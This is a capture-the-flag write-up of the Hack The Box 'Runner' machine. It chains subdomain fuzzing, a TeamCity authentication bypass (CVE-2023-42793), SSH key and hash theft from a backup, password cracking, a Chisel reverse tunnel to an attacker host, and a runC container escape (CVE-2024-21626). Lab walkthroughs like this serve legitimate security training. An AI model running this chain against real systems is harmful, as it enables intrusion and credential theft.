 HTB: Runner – Writeup / Walkthrough

Difficulty: Medium
Category: Linux / DevOps / Exploitation Chain

Summary

To root the "Runner" box, I chained multiple real-world exploitation techniques:

    🔍 Subdomain enumeration → Discovered teamcity.runner.htb

    ⚙️ CVE-2023-42793 → Gained TeamCity admin access

    🔓 Extracted SSH key (John) & cracked hash (Matthew)

    🧬 Pivoted into Portainer.io via port-forwarding

    ⚔️ CVE-2024-21626 → Container escape → Root shell

🔎 Recon & Subdomain Enumeration

Only ports 22 (SSH), 80 (HTTP), and 8000 (Nagios) were open. Nothing exploitable at first glance.

I used ffuf for subdomain brute-forcing and discovered:

ffuf -H "Host: FUZZ.runner.htb" -u http://runner.htb/ \
     -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt --fw 4

✅ Found: teamcity.runner.htb
📌 Added to /etc/hosts for access.
🔓 Exploiting TeamCity: CVE-2023-42793

Targeting the TeamCity instance with CVE-2023-42793, I used Zyad-Elsayed’s exploit:

python3 exploit.py --url http://teamcity.runner.htb

🎯 Got creds for a new TeamCity admin account → Logged in.
📦 Backup Abuse → SSH Key Extraction

Created a TeamCity backup under Administration > Backup.

📥 Downloaded from the History tab.

Extracted:

    🗝️ SSH private key for john:
    config/projects/AllProjects/pluginData/ssh_keys/id_rsa

    🔐 Password hashes from database_dump/users

Used the key to login as john:

chmod 600 id_rsa
ssh -i id_rsa john@runner.htb

✅ Got user.txt.

Cracked Matthew’s hash with john:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

🕸️ Port Forwarding via Chisel

Noticed port 9000 using:

ss -tulpn

Set up Chisel reverse tunnel:

    On attacker:

./chisel server -p 4444 --reverse

On target:

    ./chisel client <attacker_ip>:4444 R:9000:127.0.0.1:9000

🖥️ Now accessible: http://127.0.0.1:9000 → Portainer login
🔥 Container Escape: CVE-2024-21626 (runC)

Logged into Portainer using Matthew's credentials.

Spawned a container from teamcity:latest. Set working directory to /proc/self/fd/8 (required for the runC exploit to trigger).

Accessed container console as root, escaped with:

cat ../../../../root/root.txt

💥 Rooted.
🧾 Flags

    user.txt – John via SSH key

    root.txt – Via runC container escape

✅ Takeaways

This machine mimicked a realistic attack chain:

    DevOps misconfigs (TeamCity backup)

    Subdomain brute-force → Entry point

    Chisel tunneling + Container runtime escape

